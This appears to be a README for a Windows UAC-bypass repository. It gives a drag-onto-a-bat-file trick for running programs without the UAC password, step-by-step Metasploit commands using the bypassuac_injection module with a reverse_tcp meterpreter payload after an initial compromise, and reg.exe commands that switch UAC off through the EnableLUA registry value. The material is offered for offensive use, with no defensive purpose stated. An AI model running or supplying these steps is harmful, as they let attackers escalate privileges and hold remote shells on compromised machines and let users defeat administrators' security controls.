# bypassUACpasswd to run programs , and other UAC TRICKS to by pass from meterpreter.


1 download any program u wanna install or run on windows 10 that is protected by UAC password

2 click on the program and drag to the bat file 

3 DONE!

special thanks to wolfyytheslayer
=============================
# for meterpreter
# how to bypass UAC after having a permission denied on windows 10-7


1 on meterpreter type background & remember the session number

2 use exploit/windows/local/bypassuac_injection 
3 set session "number"
4 set payload windows/x64/meterpreter/reverse_tcp
5 run 

* if you are stuck type show options for more informations.



================= DISABLE UAC ==================

# to disable 
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

============
# to enable
============
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f

